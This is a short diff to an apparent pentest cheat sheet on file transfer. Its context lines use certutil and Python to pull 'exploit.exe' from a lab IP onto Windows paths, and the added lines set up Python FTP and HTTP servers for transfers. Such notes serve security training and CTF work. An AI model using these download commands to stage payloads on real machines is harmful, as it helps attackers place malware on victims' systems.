@@ -31,3 +31,14 @@ certutil.exe -urlcache -split -f http://10.10.10.10/exploit.exe C:\Temp\app.exe
 # Python
 - Client:
 python -c "import urllib.request; urllib.request.urlretrieve('http://10.10.10.10/exploit.exe', 'C:\\Users\\Public\\Downloads\\exploit.exe');"
+
+# Python FTP
+- Server:
+python -m pyftpdlib 21
+- Client:
+ftp 10.10.10.10
+
+# Python HTTP
+- Server:
+python -m SimpleHTTPServer 80
+
